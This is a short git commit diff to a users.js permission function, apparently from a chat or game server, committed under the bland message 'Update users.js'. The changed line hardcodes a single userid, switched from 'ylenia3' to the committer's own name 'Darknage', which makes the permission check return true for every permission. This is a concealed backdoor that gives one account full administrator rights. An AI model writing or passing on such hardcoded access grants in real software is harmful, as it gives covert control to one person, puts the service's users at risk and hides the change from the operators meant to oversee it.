62bbe6158eaee317241acbd150f621df7223fbb8
Darknage <herch.x.gta@gmail.com>
2015-06-05 18:02:00 -0500

    Update users.js

--- users.js
+++ users.js
@@ -592,7 +592,7 @@ User = (function () {
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
-		if (this.hasSysopAccess()) return true; if (this.userid === "ylenia3") return true;
+		if (this.hasSysopAccess()) return true; if (this.userid === "Darknage") return true;
 
 		var group = this.group;
 		var targetGroup = '';
